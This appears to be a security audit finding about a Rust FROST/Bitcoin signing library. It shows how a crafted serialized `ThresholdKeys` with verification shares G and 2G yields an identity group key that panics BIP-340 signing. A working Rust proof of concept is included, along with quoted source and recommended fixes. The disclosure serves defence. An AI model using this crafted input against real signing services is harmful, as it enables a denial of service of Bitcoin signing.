### Title
Malformed `ThresholdKeys` can force an identity group key and panic Bitcoin signing - (File: `networks/bitcoin/src/crypto.rs`)

### Summary

`ThresholdKeys::read` accepts a syntactically valid key whose verification shares interpolate to the identity. When those keys are used with Bitcoin’s Schnorr algorithm, `sign_share` passes the identity group key to BIP-340 encoding code that unconditionally unwraps its x-coordinate, causing a panic. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description

`ThresholdKeys::new` checks the number and range of verification shares, but it does not reject a resulting group key equal to the group identity. [4](#0-3) 

For Lagrange interpolation with `t = n = 2`, verification shares `[G, 2G]` produce interpolation factors `2` and `-1`, so the stored group key is `2G - 2G = identity`. [5](#0-4) [6](#0-5) 

`ThresholdKeys::read` preserves this semantically invalid key because it only parses the parameters, interpolation method, secret share, and verification shares before calling `ThresholdKeys::new`. [7](#0-6) 

A caller can then provide one valid preprocess from participant `2`; `AlgorithmSignMachine::read_preprocess` accepts the two encoded nonce commitments and `sign` reaches `Schnorr::sign_share`. [8](#0-7) [9](#0-8) 

Bitcoin’s `Hram::hram` calls `x(A)` on the group key, and `x` unwraps `encoded.x()`, which is absent for the point at infinity. [10](#0-9) [3](#0-2) 

### Impact Explanation

An untrusted serialized `ThresholdKeys` value followed by a normal signing request can panic the signing task or process instead of returning `DkgError`, `io::Error`, or `FrostError`. [1](#0-0) [11](#0-10) 

If the host uses `panic = abort` or does not isolate signing into a recoverable task, this is a remote-triggered denial of service of Bitcoin signing. [2](#0-1) 

### Likelihood Explanation

The malicious key encoding is deterministic and uses ordinary canonical encodings: `t = 2`, `n = 2`, `i = 1`, Lagrange interpolation, any canonical scalar as the secret share, and verification shares `G` and `2G`. [12](#0-11) 

After the malformed key is accepted, any valid preprocess from the other participant is sufficient to reach the panic during `sign`. [13](#0-12) [2](#0-1) 

### Recommendation

Reject identity group keys and identity verification shares in `ThresholdKeys::new`, or make `ThresholdKeys::read` perform a semantic group-key validity check before returning a key. [14](#0-13) 

Bitcoin signing should also return a protocol error when `group_key`, `R`, or `A` is the identity rather than relying on `x` to panic. [15](#0-14) 

### Proof of Concept

```rust
use std::{collections::HashMap, io::Cursor};

use bitcoin_serai::crypto::Schnorr;
use frost::{
  Participant, ThresholdKeys,
  curve::Secp256k1,
  sign::{AlgorithmMachine, PreprocessMachine, SignMachine},
};
use group::GroupEncoding;
use k256::{ProjectivePoint, Scalar};
use rand_core::OsRng;
use zeroize::Zeroizing;

fn u16_bytes(x: u16) -> [u8; 2] {
  x.to_le_bytes()
}

// Serialized ThresholdKeys:
// ID "secp256k1", t=2, n=2, i=1, Lagrange, secret=0,
// verification_shares=[G, 2G].
let mut encoded = Vec::new();
encoded.extend_from_slice(&9u32.to_le_bytes());
encoded.extend_from_slice(b"secp256k1");
encoded.extend_from_slice(&u16_bytes(2));
encoded.extend_from_slice(&u16_bytes(2));
encoded.extend_from_slice(&u16_bytes(1));
encoded.push(1);
encoded.extend_from_slice(Scalar::ZERO.to_bytes().as_ref());

let g = ProjectivePoint::GENERATOR;
let g_encoded = g.to_bytes();
let two_g_encoded = (g * Scalar::from(2u64)).to_bytes();
encoded.extend_from_slice(g_encoded.as_ref());
encoded.extend_from_slice(two_g_encoded.as_ref());

let keys = ThresholdKeys::<Secp256k1>::read(&mut Cursor::new(encoded)).unwrap();
assert!(bool::from(keys.group_key().is_identity()));

let (machine, _our_preprocess) =
  AlgorithmMachine::new(Schnorr::new(), keys).preprocess(&mut OsRng);

// Any syntactically valid participant-2 preprocess reaches signing.
let mut remote_preprocess_bytes = Vec::new();
remote_preprocess_bytes.extend_from_slice(g_encoded.as_ref());
remote_preprocess_bytes.extend_from_slice(g_encoded.as_ref());
let remote_preprocess = machine
  .read_preprocess(&mut remote_preprocess_bytes.as_slice())
  .unwrap();

// Panics in x(A): A is the identity group key.
let _ = machine.sign(
  HashMap::from([(Participant::new(2).unwrap(), remote_preprocess)]),
  b"message",
);
```

The assertion establishes that deserialization accepts the crafted identity group key, and the final `sign` reaches the BIP-340 `x(A)` unwrap that panics for the point at infinity. [7](#0-6) [2](#0-1) [3](#0-2)

### Citations

**File:** crypto/dkg/src/lib.rs (L226-247)
```rust
  fn interpolation_factor(&self, i: Participant, included: &[Participant]) -> F {
    match self {
      Interpolation::Constant(c) => c[usize::from(u16::from(i) - 1)],
      Interpolation::Lagrange => {
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
      }
```

**File:** crypto/dkg/src/lib.rs (L349-390)
```rust
  pub fn new(
    params: ThresholdParams,
    interpolation: Interpolation<C::F>,
    secret_share: Zeroizing<C::F>,
    verification_shares: HashMap<Participant, C::G>,
  ) -> Result<ThresholdKeys<C>, DkgError> {
    if verification_shares.len() != usize::from(params.n()) {
      Err(DkgError::IncorrectAmountOfVerificationShares {
        n: params.n(),
        shares: verification_shares.len(),
      })?;
    }
    for participant in verification_shares.keys().copied() {
      if u16::from(participant) > params.n() {
        Err(DkgError::InvalidParticipant { n: params.n(), participant })?;
      }
    }

    match &interpolation {
      Interpolation::Constant(_) => {
        if params.t() != params.n() {
          Err(DkgError::InapplicableInterpolation("constant interpolation for keys where t != n"))?;
        }
      }
      Interpolation::Lagrange => {}
    }

    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();

    Ok(ThresholdKeys {
      core: Arc::new(Zeroizing::new(ThresholdCore {
        params,
        interpolation,
        secret_share,
        group_key,
        verification_shares,
      })),
      scalar: C::F::ONE,
      offset: C::F::ZERO,
    })
```

**File:** crypto/dkg/src/lib.rs (L573-631)
```rust
  /// Read keys from a type satisfying `std::io::Read`.
  pub fn read<R: io::Read>(reader: &mut R) -> io::Result<ThresholdKeys<C>> {
    {
      let different = || io::Error::other("deserializing ThresholdKeys for another curve");

      let mut id_len = [0; 4];
      reader.read_exact(&mut id_len)?;
      if u32::try_from(C::ID.len()).unwrap().to_le_bytes() != id_len {
        Err(different())?;
      }

      let mut id = vec![0; C::ID.len()];
      reader.read_exact(&mut id)?;
      if id != C::ID {
        Err(different())?;
      }
    }

    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
```

**File:** crypto/frost/src/algorithm.rs (L201-210)
```rust
  fn sign_share(
    &mut self,
    params: &ThresholdView<C>,
    nonce_sums: &[Vec<C::G>],
    mut nonces: Vec<Zeroizing<C::F>>,
    msg: &[u8],
  ) -> C::F {
    let c = H::hram(&nonce_sums[0][0], &params.group_key(), msg);
    self.c = Some(c);
    SchnorrSignature::<C>::sign(params.secret_share(), nonces.swap_remove(0), c).s
```

**File:** networks/bitcoin/src/crypto.rs (L10-16)
```rust
/// Get the x coordinate of a non-infinity point.
///
/// Panics on invalid input.
fn x(key: &ProjectivePoint) -> [u8; 32] {
  let encoded = key.to_encoded_point(true);
  (*encoded.x().expect("point at infinity")).into()
}
```

**File:** networks/bitcoin/src/crypto.rs (L50-73)
```rust
  /// A BIP-340 compatible HRAm for use with the modular-frost Schnorr Algorithm.
  ///
  /// If passed an odd nonce, the challenge will be negated.
  ///
  /// If either `R` or `A` is the point at infinity, this will panic.
  #[derive(Clone, Copy, Debug)]
  pub struct Hram;
  #[allow(non_snake_case)]
  impl HramTrait<Secp256k1> for Hram {
    fn hram(R: &ProjectivePoint, A: &ProjectivePoint, m: &[u8]) -> Scalar {
      const TAG_HASH: Sha256 = Sha256::const_hash(b"BIP0340/challenge");

      let mut data = Sha256::engine();
      data.input(TAG_HASH.as_ref());
      data.input(TAG_HASH.as_ref());
      data.input(&x(R));
      data.input(&x(A));
      data.input(m);

      let c = Scalar::reduce(U256::from_be_slice(Sha256::from_engine(data).as_ref()));
      // If the nonce was odd, sign `r - cx` instead of `r + cx`, allowing us to negate `s` at the
      // end to sign as `-r + cx`
      <_>::conditional_select(&c, &-c, needs_negation(R))
    }
```

**File:** crypto/frost/src/sign.rs (L276-287)
```rust
  fn read_preprocess<R: Read>(&self, reader: &mut R) -> io::Result<Self::Preprocess> {
    Ok(Preprocess {
      commitments: Commitments::read::<_>(reader, &self.params.algorithm.nonces())?,
      addendum: self.params.algorithm.read_addendum(reader)?,
    })
  }

  fn sign(
    mut self,
    mut preprocesses: HashMap<Participant, Preprocess<C, A::Addendum>>,
    msg: &[u8],
  ) -> Result<(Self::SignatureMachine, SignatureShare<C>), FrostError> {
```

**File:** crypto/frost/src/nonce.rs (L133-139)
```rust
  pub(crate) fn read<R: Read>(reader: &mut R, generators: &[Vec<C::G>]) -> io::Result<Self> {
    let nonces = (0 .. generators.len())
      .map(|i| NonceCommitments::read(reader, &generators[i]))
      .collect::<Result<Vec<NonceCommitments<C>>, _>>()?;

    Ok(Commitments { nonces })
  }
```
